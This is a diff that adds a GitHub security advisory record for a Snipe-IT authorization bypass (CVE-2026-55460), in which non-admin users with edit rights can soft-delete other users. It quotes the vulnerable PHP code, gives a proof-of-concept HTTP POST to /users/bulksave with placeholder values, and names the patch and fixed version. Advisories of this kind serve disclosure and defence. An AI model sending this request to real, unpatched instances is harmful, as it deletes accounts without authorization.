@@ -1,0 +1,72 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-vgx7-c78r-69w9",
+  "modified": "2026-08-28T17:48:36Z",
+  "published": "2026-08-28T17:48:36Z",
+  "aliases": [
+    "CVE-2026-55460"
+  ],
+  "summary": "Snipe-IT has an authorization bypass on bulk editing users",
+  "details": "### Impact\nAn authenticated non-admin user with `users.view` and `users.edit`, but without `users.delete`, can directly POST to `/users/bulksave` and soft-delete another non-admin user. The UI and confirmation route require `users.delete`, but the destructive sink only authorizes `update`.\n\n### Attacker Model\n\nAuthenticated non-admin user with:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ json\n{\"users.view\":\"1\",\"users.edit\":\"1\"}\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe attacker does not have `users.delete`, `admin`, or `superuser`.\n\n### Affected Component\n\n-   `routes/web/users.php`\n\n-   `app/Http/Controllers/Users/BulkUsersController.php`\n\n-   Endpoint: `POST /users/bulksave`\n\n### Root Cause\n\nThe UI only exposes bulk delete to users with `delete` permission:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php\n@can('delete', \\App\\Models\\User::class)\n    <option value=\"delete\">...</option>\n    <option value=\"merge\">...</option>\n@endcan\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe confirmation path also checks `delete`:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php\n} elseif ($request->input('bulk_actions') == 'delete') {\n    $this->authorize('delete', User::class);\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nHowever, the destructive route is registered separately:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php\nRoute::post('bulksave', [Users\\BulkUsersController::class, 'destroy'])\n    ->name('users/bulksave');\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nand `destroy()` authorizes only `update`:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php\npublic function destroy(Request $request)\n{\n    $this->authorize('update', User::class);\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen `delete_user=1` is present, the method reaches:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php\n$user->delete();\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n### Proof of Concept\n\n1.  Create a non-admin attacker account with `users.view` and `users.edit`, but not `users.delete`.\n\n2.  Create a harmless non-admin target user.\n\n3.  Log in as the attacker and obtain a valid CSRF token.\n\n4.  Send:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ http\nPOST /users/bulksave HTTP/1.1\nHost: <snipe-it-host>\nCookie: snipeit_session=<attacker-session>\nContent-Type: application/x-www-form-urlencoded\n\n_token=<csrf-token>\nids[]=<target-user-id>\ndelete_user=1\nstatus_id=<valid-status-id>\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nObserved response:\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ http\nHTTP/1.1 302 Found\nLocation: http://<snipe-it-host>/users\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\n### Patches\nPatched in 374f426f0c",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "snipe/snipe-it"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "8.6.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 8.6.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/security/advisories/GHSA-vgx7-c78r-69w9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55460"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/commit/374f426f0c6bb7a4f129f7b85051cc1da753a0f5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/grokability/snipe-it"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/releases/tag/v8.6.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-863"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-08-28T17:48:36Z",
+    "nvd_published_at": "2026-07-10T19:17:24Z"
+  }
+}
